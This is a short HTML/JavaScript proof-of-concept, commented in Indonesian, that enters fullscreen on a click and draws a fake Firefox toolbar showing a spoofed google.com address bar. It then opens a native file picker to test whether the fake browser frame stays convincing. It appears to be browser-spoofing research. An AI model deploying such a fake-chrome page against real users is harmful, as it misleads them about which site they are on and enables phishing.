<!DOCTYPE html>
<html>
<body>
<p>Klik untuk mulai (gesture user)</p>
<script>
async function run() {
  await document.documentElement.requestFullscreen();
  // Gambar chrome Firefox palsu + URL bar google.com
  const bar = document.createElement("div");
  bar.style.cssText = "position:fixed;top:0;left:0;right:0;height:70px;background:#f9f9fb;" +
    "z-index:999999;display:flex;align-items:center;padding:0 8px;gap:8px;border-bottom:1px solid #e0e0e6";
  bar.innerHTML =
    "<span>⬅️</span><span>➡️</span><span>⟳</span>" +
    "<div style='flex:1;background:#fff;border:1px solid #bfbfc9;border-radius:4px;" +
    "height:34px;display:flex;align-items:center;padding:0 10px;color:#15141a;font-size:13px'>" +
    "🛡 https://www.google.com</div>" +
    "<span>☰</span>";
  document.body.appendChild(bar);

  // Trigger dialog NATIVE Firefox (file picker) yang digambar DI ATAS fullscreen content.
  // Yang diuji: apakah picker/dialog mengexpose area di luar fullscreen
  // atau mereset tampilan sehingga chrome palsu tidak sinkron.
  setTimeout(() => {
    const i = document.createElement("input");
    i.type = "file";
    i.onchange = () => document.exitFullscreen();
    i.click();
  }, 1000);
}
document.body.onclick = () => run(), {once:true};
</script>
</body>
</html>
